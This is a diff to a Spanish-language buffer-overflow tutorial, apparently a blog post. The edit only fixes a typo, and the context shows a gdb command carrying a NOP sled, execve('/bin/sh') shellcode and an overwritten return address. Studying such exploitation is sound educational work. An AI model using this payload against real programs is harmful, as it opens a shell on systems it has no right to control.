@@ -305,7 +305,7 @@ Por ultimo para poder ejecutar nuestra shellcode tenemos que cambiar esos 8 byte
 ![](/assets/images/bof-stack-based/ret-shellcode.png)
 
 
-El comando para a ejecutar en gdb queda de la siguiente forma:
+El comando para ejecutar en gdb queda de la siguiente forma:
 
 ```
 r $(python2 -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'\xe0\xdc\xff\xff\xff\x7f\x00\x00'")
